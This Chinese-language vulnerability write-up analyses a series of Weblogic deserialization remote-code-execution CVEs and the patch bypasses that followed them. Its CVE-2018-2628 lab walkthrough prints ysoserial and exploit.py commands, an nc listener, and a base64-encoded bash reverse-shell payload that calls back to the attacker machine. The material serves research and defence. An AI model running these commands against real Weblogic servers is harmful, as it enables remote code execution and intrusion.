***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

##  **前言**

**目前Weblogic在全球的使用量占居前列，据统计，在全球范围内对互联网开放Weblogic服务的资产数量多达35382台，其中归属中国地区的资产数量为10562台。如果爆发一个Weblogic高危漏洞，那将会给中国的大量用户带来巨大的灾难。**

**本文主要介绍了近五年爆发的Weblogic反序列化的高危漏洞，一次又一次的修补，一次又一次的绕过，漏洞挖掘者和漏洞防御者之间的博弈从未停止过，而且这种博弈在今后的生活中也将会愈演愈烈。**

## 0x01 Weblogic简介

Weblogic是美国[Oracle](https://baike.baidu.com/item/Oracle)公司出品的一个应用服务器(application
server)，确切的说是一个基于Java
EE架构的[中间件](https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6)，是用于开发、集成、部署和管理大型分布式Web应用、网络应用和
[数据库应用](https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8)的Java[应用服务器](https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8)。

Weblogic将Java的动态功能和Java
Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的Java（Java
EE）应用[服务器](https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8)软件之一，也是世界上第一个成功商业化的Java
EE应用服务器，具有可扩展性、快速开发、灵活、可靠等优势。

在功能性上，Weblogic是Java EE的全能应用服务器，包括EJB
、JSP、servlet、JMS等，是商业软件里排名第一的容器（JSP、servlet、EJB等），并提供其他工具（例如Java编辑器），因此也是一个综合的开发及运行环境。

在扩展性上，Weblogic Server凭借其出色的群集技术，拥有处理关键Web应用系统问题所需的性能、可扩展性和高可用性。Weblogic
Server既实现了网页群集，也实现了EJB组件群集，而且不需要任何专门的硬件或操作系统支持。网页群集可以实现透明的复制、负载平衡以及表示内容容错。无论是网页群集，还是组件群集，对于电子商务解决方案所要求的可扩展性和可用性都是至关重要的。

目前Weblogic在全球的使用量也占居前列，据统计，在全球范围内对互联网开放Weblogic服务的资产数量多达35382台，美国和中国的Weblogic的使用量接近Weblogic总使用量的70%，其中归属中国地区的资产数量为10562台。

![服务器数量](https://image.3001.net/images/20180802/1533195652_5b62b58450465.png!small)

这样的话，如果爆发一个Weblogic高危漏洞，那将会给中国的大量用户带来巨大的灾难。

## 0x02 高危漏洞介绍

Weblogic漏洞有很多，但是五年之前的大多数漏洞只是小打小闹，对服务器并不能造成巨大的影响。然而，自从2015年11月6日，FoxGlove
Security 安全团队的 @breenmachine 在博客中介绍了如何利用Java反序列化和 Apache Commons Collections
这一基础类库来攻击最新版的
Weblogic、WebSphere、JBoss等主流的Java服务器，并且都可以实现远程代码执行，Weblogic变得不再安全。

道高一尺魔高一丈，伴随着Weblogic补丁的不断发布，各种的绕过方法也是不断地更新。下面介绍一下近5年来让Oracle头痛不已的Weblogic反序列化漏洞。

高危漏洞主要涉及到两个种类：

> 利用xml decoded反序列化进行远程代码执行的漏洞，例如：CVE-2017-10271，CVE-2017-3506。
>
>
> 利用java反序列化进行远程代码执行的漏洞，例如：CVE-2015-4852、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2018-2628、CVE-2018-2894。

### xml decoded反序列化RCE漏洞

 **1\. CVE-2017-3506**

此漏洞主要是由于wls组件使用了webservice来处理soap请求，在
**weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest** 方法中，当
**localHeader1** 和 **localHeader2** 都不为 **null** 时，将会把 **<
work:WorkContext>**所包含的数据传入
**weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld** 方法。在此方法中，对
**WorkContextXmlInputAdapter** 类进行了实例化，并调用 **WorkContextXmlInputAdapter**
类的构造方法，通过 **XMLDecoder()** 进行反序列化操作。

 **weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest**
代码如下图所示：

![weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest代码](https://image.3001.net/images/20180802/1533195667_5b62b593a9ad9.png!small)

 **weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld** 代码如下图所示：

![weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld代码](https://image.3001.net/images/20180802/1533195677_5b62b59ddf0b5.png!small)

 **weblogic.wsee.workarea.WorkContextXmlInputAdapter** 代码如下图所示：

![weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld代码](https://image.3001.net/images/20180802/1533195687_5b62b5a764200.png!small)

 _CVE-2017-3506 POC_

> /wls-wsat/CoordinatorPortType
>
> /wls-wsat/RegistrationPortTypeRPC
>
> /wls-wsat/ParticipantPortType
>
> /wls-wsat/RegistrationRequesterPortType
>
> /wls-wsat/CoordinatorPortType11
>
> /wls-wsat/RegistrationPortTypeRPC11
>
> /wls-wsat/ParticipantPortType11
>
> /wls-wsat/RegistrationRequesterPortType11

在上方8个路径中任意选择一个路径，将 **content-type** 改成 **text/xml** 类型，传入payload，即可利用漏洞。

在上方的POC中，闭合的 **< work:WorkContext>**中可以构造任何我们想要执行的命令。在先后引用
**java.beans.XMLDecoder** 、 **java.lang.ProcessBuilder** 、
**java.lang.String** 之后，便可以在index中设定参数序号，并在string标签中传入想要远程执行的命令。

 **2\. CVE-2017-10271漏洞**

CVE-2017-10271是基于CVE-2017-3506漏洞原理基础上，对CVE-2017-3506修复补丁的一次绕过。下图是CVE-2017-3506修复补丁的部分代码：

![CVE-2017-3506修复补丁的部分代码](https://image.3001.net/images/20180802/1533195710_5b62b5be539cd.png!small)

图中红框内的代码是限制CVE-2017-3506漏洞利用的黑名单，这次补丁修补得非常的简陋，仅仅是根据POC中的object标签进行了修补，所以很快就出现了CVE-2017-10271漏洞。

CVE-2017-10271的POC与CVE-2017-3506的POC很相似，只是将object标签换成了array或void等标签，即可触发远程代码执行漏洞。

因此，在CVE-2017-10271漏洞爆发之后，Oracle官方也进行了补丁的完善，这一次的补丁考虑得比较全面，在黑名单中又添加了new、method、void、array等关键字进行漏洞修补，成功防御了CVE-2017-10271漏洞。

### java反序列化RCE漏洞

 **1\. CVE-2015-4852漏洞**

此漏洞主要是由于apache的标准库中Apache Commons Collections基础库的 **TransformedMap** 类。当
**TransformedMap** 内的 **key** 或者 **value** 发生变化时，就会触发相应的 **Transformer** 的
**transform()** 方法。同时也可以利用 **Transformer** 数组来构造 **ChainedTransformer**
，从而触发内部的 **InvokerTransformer** 类，在这个类中可以利用java的反射机制来获得
**Runtime.getRuntime().exec** 方法，利用这个方法来执行任意命令。

通过 **AnnotationInvocationHandler** 类来重写 **readObject()** 方法，并且通过内部的
**memberValue.setValue()** 方法构造恶意的 **TransformedMap** 对象，改变 **TransformedMap**
中的 **key** 或 **value** ，通过反序列化执行构造的命令。这里推荐大家了解一下ysoserial这个工具。

工具中集成了各种java反序列化漏洞利用的payload。下图是ysoserial工具中有关于java反射机制的代码。

![关于java反射机制的代码](https://image.3001.net/images/20180802/1533195787_5b62b60bc6013.png!small)

图片中即是利用 **Transformer** 数组触发 **InvokerTransformer** 类，利用java反射机制获得
**Runtime.getRuntime().exec** 方法，从而达到执行任意命令的目的。

 _CVE-2015-4852 POC（序列化）_

序列化中的cmd字段代表着想要远程执行的命令，使用python中 **binascii.b2a_hex**
函数转换成序列化插在相应的位置上。在这里再为大家推荐一款分析java序列化结构的工具——SerializationDumper，下图是通过SerializationDumper转换后的序列化的结构：

![通过SerializationDumper转换后的序列化的结构](https://image.3001.net/images/20180802/1533195800_5b62b61824b83.png!small)

图中红框内是序列化中插入远程执行命令的序列化，同时对应着序列化解码之后的命令。通过这个分析工具，我们可以准确的找到序列化远程命令插入的位置，以及序列化的结构和引用的函数，让分析java反序列化漏洞的payload的工作变得更加便利。

 **2\. CVE-2016-0638漏洞**

此漏洞是基于CVE-2015-4852漏洞进行黑名单的绕过，CVE-2015-4852补丁主要应用在三个位置上：

> weblogic.rjvm.InboundMsgAbbrev.class :: ServerChannelInputStream
>
> weblogic.rjvm.MsgAbbrevInputStream.class
>
> weblogic.iiop.Utils.class

所以如果能找到可以在其 **readObject** 中创建自己的 **InputStream** 的对象，并且不是使用黑名单中的
**ServerChannelInputStream** 和 **MsgAbbrevInputStream** 的 **readExternal**
进行的反序列化，最后调用 **readObject()**
方法进行反序列化的数据的读取，这样就可以执行含有恶意代码的序列化代码。CVE-2016-0638漏洞就是依据这个思路找到了
**weblogic.jms.common.StreamMessageImpl** 类，其中的 **readExternal()**
方法也符合攻击的需求。攻击者可以在其中构造一个恶意的 **ObjectInputStream** 来实现payload内部的 **InputStream**
创建，调用 **readObject()** 方法实现攻击。

 _CVE-2016-0638 POC（序列化）_

此漏洞利用方式也应用到了后续要介绍的CVE-2018-2893漏洞中。

 **3\. CVE-2016-3510漏洞**

此漏洞是与CVE-2016-0638漏洞利用方式相似，只是选择了 **weblogic.corba.utils.MarshalledObject**
进行绕过，绕过之前的CVE-2015-4852和CVE-2016-0638漏洞的修复补丁。

 _CVE-2016-3510 POC（序列化）_

CVE-2016-3510的POC中插入的想要执行的命令的形式很特殊，必须要插入类似于 **bash -c
{echo,bmMgLW52IDE5Mi4xNjguMTYuMSA0MDQw}|{base64,-d}|{bash,-i}**
这种形式的命令才可以达到攻击效果，这是因为使用了 **java.lang.Runtime.exec(String)**
语句而导致的一些限制。首先是不支持shell操作符，如输出重定向以及管道。其次是传递给payload命令的参数中不能包含空格。

 **4.CVE-2017-3248漏洞**

CVE-2017-3248漏洞爆发之前，Apache Commons
Collections基础的漏洞已经进行修补，所以CVE-2017-3248漏洞利用方法与之前三个漏洞不同，这次主要是利用了JRMP
Java远程方法协议。利用 **java.rmi.registry.Registry** ，序列化
**RemoteObjectInvocationHandler** ，并使用 **UnicastRef** 和远端建立tcp连接，获取RMI
registry，最终将加载的内容利用 **readObject()**
进行解析，导致之前序列化的恶意代码执行。下图是ysoserial中相应的payload：

![ysoserial中相应的payload](https://image.3001.net/images/20180802/1533195817_5b62b62907211.png!small)

 _CVE-2017-3248 POC（序列化）_

下图是经过SerializationDumper工具转换后的payload结构：

![经过SerializationDumper工具转换后的payload结构](https://image.3001.net/images/20180802/1533195831_5b62b637da1f2.png!small)

图中红框内标注的则是负责连接监听端口的payload，这个payload的作用，笔者会在下面的CVE-2018-2628漏洞中进行操作和解释的。

 **5\. CVE-2018-2628漏洞**

CVE-2018-2628漏洞与CVE-2017-3248漏洞利用方法类似，仅仅更换了使用的rmi接口，用
**java.rmi.activation.Activator** 替换了CVE-2017-3248所使用的
**java.rmi.registry.Registry** ，从而绕过 **resolveProxyClass**
的判断，成功绕过了CVE-2017-3248漏洞的修复补丁。其他攻击流程相同。

 _CVE-2018-2628 POC（反序列化）_

下图是经过SerializationDumper工具转换后的payload结构：

![经过SerializationDumper工具转换后的payload结构](https://image.3001.net/images/20180802/1533195849_5b62b64906cf7.png!small)图中红框内标注的则是负责连接监听端口的payload。下面介绍一下利用CVE-2018-2628漏洞的方法（同样也适用于CVE-2017-3248）。

环境：

> 192.168.16.1 (nc开启监听端口，为了验证远程代码攻击是否成功，同时也是进行CVE-2018-2628漏洞攻击的攻击机)
>
> 192.168.16.2 (开启存在CVE-2018-2628漏洞的Weblogic服务的服务器，被攻击的目标)
>
> 192.168.16.3 (利用JRMPListener开启监听端口)

服务器192.168.16.2(Weblogic-10.3.6.0) 开启Weblogic服务：

![服务器192.168.16.2\(Weblogic-10.3.6.0\)
开启Weblogic服务](https://image.3001.net/images/20180802/1533195863_5b62b65748891.png!small)192.168.16.3中执行：

    
    
    java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 
    
    CommonsCollections5 'bash -c

 **{echo,bmMgLW52IDE5Mi4xNjguMTYuMSA0MDQw}|{base64,-d}|{bash,-i}**
指令通过ysoserial工具生成payload（注意，这里的指令需要是 **bash -c
{echo,BASE64}|{base64,-d}|{bash,-i}** 格式，这里贴出一个生成这种格式的在线网站：
_<http://jackson.thuraisamy.me/runtime-exec-payloads.html>_ ）。

![图片.png](https://image.3001.net/images/20180802/1533195874_5b62b6626e8c1.png!small)192.168.16.1中执行：

> nc -nlvp 4040开启服务进行监听4040端口；
>
> python exploit.py 192.168.16.2 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
> 192.168.16.3 1099 JRMPClient2指令执行payload。

![执行命令](https://image.3001.net/images/20180802/1533195890_5b62b672d87f6.png!small)

至此，整套攻击流程就已经执行完毕。剩下的只需要等待着服务器连接到攻击机，漏洞就利用成功了。

 **6\. CVE-2017-2893漏洞**

CVE-2018-2893漏洞，同样是对 **resolveProxyClass** 函数进行绕过，导致攻击者可以利用 **UnicastRef**
和远端建立tcp连接，获取RMI registry，再将加载的内容利用 **readObject** 解析，从而造成反序列化远程代码执行。

CVE-2018-2893漏洞绕过方式是利用 **StreamMessageImpl** 对ysoserial工具中的JRMPClient生成的
**payloadObject** 进行封装，由于 **StreamMessageImpl** 在进行反序列化时并不会被
**resolveProxyClass** 检测，导致绕过的产生，最后成功的进行了反序列化攻击。

下面的两张图片分别是streamMessageImpl的封装和JRMPClient：

![streamMessageImpl的封装](https://image.3001.net/images/20180802/1533195899_5b62b67b569a2.png!small)![JRMPClient](https://image.3001.net/images/20180802/1533195906_5b62b682376b0.png!small)

 _CVE-2018-2893 POC（序列化）_

CVE-2018-2893的POC相当于CVE-2016-0638和CVE-2017-3248的结合体，将CVE-2016-0638的StreamMessageImpl类封装CVE-2017-3248的JRMPClient，从而形成了CVE-2018-2893的POC。

## 0x03 展望

以上主要介绍了近五年爆发的Weblogic反序列化的高危漏洞，一次又一次的修补，一次又一次的绕过，漏洞挖掘者和漏洞防御者之间的博弈从未停止过，而且这种博弈在今后的生活中也将会愈演愈烈。

目前Weblogic的修补措施还只是将网上流传的POC中比较危险的函数写入黑名单加以控制，但是这些被限制的函数会有许许多多的替代函数，而且每一个替代函数都会轻轻松松地绕过黑名单，造成新的Weblogic反序列化漏洞的形成。如果Weblogic仅仅局限于修补发布的POC，那么补丁的绕过很有可能会一直进行下去。修补与绕过，下一个漏洞才是最精彩的！

作为漏洞分析研究员，我们的职责就是深度剖析漏洞原理，并且思考是否有其他的利用方式。这是一场白帽子与黑帽子之间的时间赛跑，我们要抢夺先机，提前发现漏洞利用的手段，防止其他黑帽子通过网络攻击干扰我们正常的生活。

Weblogic漏洞在修复与绕过的交相呼应下变得精彩，而又富有艺术。网络安全在防御与攻击的博弈中也变得迷人，而又富有魅力。同时，也正是因为这种博弈，我们的网络环境才会变得更加安全，更加坚不可摧。

 ***本文作者：千里目安全实验室，转载请注明来自 FreeBuf.COM。**

